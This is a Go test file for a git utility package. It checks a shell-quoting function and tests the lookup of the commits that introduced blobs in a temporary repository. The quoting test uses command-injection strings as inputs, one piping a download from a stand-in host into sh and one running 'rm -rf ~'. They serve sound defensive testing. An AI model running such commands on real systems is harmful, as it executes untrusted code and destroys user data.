package gitutil

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestShellQuote(t *testing.T) {
	tests := map[string]string{
		"branch":             "'branch'",
		"$(curl evil.sh|sh)": "'$(curl evil.sh|sh)'",
		`x";rm -rf ~;"`:      `'x";rm -rf ~;"'`,
		"it's safe":          `'it'\''s safe'`,
		"line\nfeed":         "'<invalid path>'",
	}
	for input, want := range tests {
		if got := ShellQuote(input); got != want {
			t.Errorf("ShellQuote(%q) = %q, want %q", input, got, want)
		}
	}
}

func TestBlobIntroductions(t *testing.T) {
	dir := t.TempDir()
	for _, args := range [][]string{
		{"init", "-q"},
		{"config", "user.name", "Repoctor Test"},
		{"config", "user.email", "repoctor-test@example.invalid"},
	} {
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		if output, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v: %s", args, err, output)
		}
	}
	filename := filepath.Join(dir, "secret.txt")
	if err := os.WriteFile(filename, []byte("secret"), 0600); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("git", "add", "secret.txt")
	cmd.Dir = dir
	if output, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git add: %v: %s", err, output)
	}
	cmd = exec.Command("git", "commit", "-qm", "add secret")
	cmd.Dir = dir
	if output, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git commit: %v: %s", err, output)
	}

	blob, err := GitLines(dir, "rev-list", "--objects", "--all")
	if err != nil || len(blob) == 0 {
		t.Fatalf("list objects: %v", err)
	}
	introductions, err := BlobIntroductions(dir)
	if err != nil {
		t.Fatal(err)
	}
	fields := strings.Fields(blob[len(blob)-1])
	if len(fields) < 2 {
		t.Fatalf("unexpected object line: %q", blob[len(blob)-1])
	}
	if introductions[fields[0]].Commit == "" {
		t.Fatalf("blob introduction missing for %s: %#v", fields[0], introductions)
	}
}
